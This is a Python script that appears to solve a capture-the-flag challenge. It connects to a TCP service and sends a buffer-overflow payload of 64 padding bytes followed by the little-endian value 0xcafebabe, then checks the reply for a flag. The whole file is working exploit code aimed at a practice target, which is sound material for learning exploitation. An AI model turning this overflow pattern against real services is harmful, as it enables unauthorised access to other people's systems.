import socket
import struct
import sys

def solve(host="localhost", port=1337):
    print(f"[*] Connecting via raw TCP socket to {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # Read initial banner
        banner = s.recv(1024).decode('utf-8', errors='replace')
        print("[+] Received Banner:\n", banner)
        
        # Payload: 64 bytes padding + 0xcafebabe (little-endian: \xbe\xba\xfe\xca) + newline
        payload = b"A" * 64 + struct.pack("<I", 0xcafebabe) + b"\n"
        print(f"[*] Sending {len(payload)} bytes payload over TCP socket...")
        s.sendall(payload)
        
        # Read response
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"flag{" in response.lower() or b"access granted" in response.lower():
                    break
            except socket.timeout:
                break
                
        output = response.decode('utf-8', errors='replace')
        print("[+] Response Output:\n", output)
        s.close()
        
        if "flag{" in output or "FLAG{" in output:
            print("[+] Challenge Solved Successfully!")
            return True
    except Exception as e:
        print(f"[-] Socket Connection Error: {e}")
        
    return False

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    success = solve(host, port)
    sys.exit(0 if success else 1)
